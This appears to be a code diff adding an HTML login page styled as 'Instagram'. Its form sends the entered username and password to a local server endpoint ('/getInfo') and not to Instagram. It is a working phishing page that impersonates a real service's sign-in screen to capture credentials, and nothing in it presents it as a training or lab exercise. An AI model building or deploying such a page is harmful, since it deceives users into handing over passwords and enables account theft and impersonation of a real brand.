@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+    body{
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .box{
+        width: 340px;
+        padding: 30px;
+        background: rgba(255,255,255,0.15);
+        backdrop-filter: blur(10px);
+        border-radius: 12px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    h2{
+        color: white;
+        margin-bottom: 25px;
+        font-weight: bold;
+    }
+
+    input{
+        width: 100%;
+        height: 45px;
+        margin-bottom: 15px;
+        border-radius: 7px;
+        border: none;
+        padding: 0 10px;
+        background: rgba(255,255,255,0.25);
+        color: white;
+        outline: none;
+    }
+
+    ::placeholder{
+        color: rgba(255,255,255,0.7);
+    }
+
+    .button{
+        width: 100%;
+        height: 45px;
+        border: none;
+        border-radius: 7px;
+        background: #3897f0;
+        color: white;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 10px;
+        
+    }
+
+    button:hover{
+        background: #2d83d6;
+    }
+
+    .text{
+        margin-top: 20px;
+        font-size: 14px;
+        color: white;
+    }
+
+    .text a{
+        color: #fff;
+        font-weight: bold;
+        text-decoration: none;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="box">
+    <h2>Instagram</h2>
+
+    <form action="http://127.0.0.1:5000/getInfo" method="post" onsubmit="return start()">
+        <input id="user" name="user" type="text" placeholder="Username or email">
+        <input id="password" name="password" type="password" placeholder="Password">
+        <input type="submit" value="Login" class="button">
+    </form>
+    
+
+    <div class="text">
+        Forgot your password? <a href="#">Get help</a>
+    </div>
+</div>
+
+
+<script>
+    function start() {
+        var username = document.getElementById("user").value;
+        var password = document.getElementById("password").value;
+
+        if (username.length < 4) {
+            alert("Username failure");
+            return false; 
+        }
+
+        if (password.length < 5) {
+            alert("Password failure");
+            return false;
+        }
+
+        return true;
+    }
+</script>
+
+
+</body>
+</html>
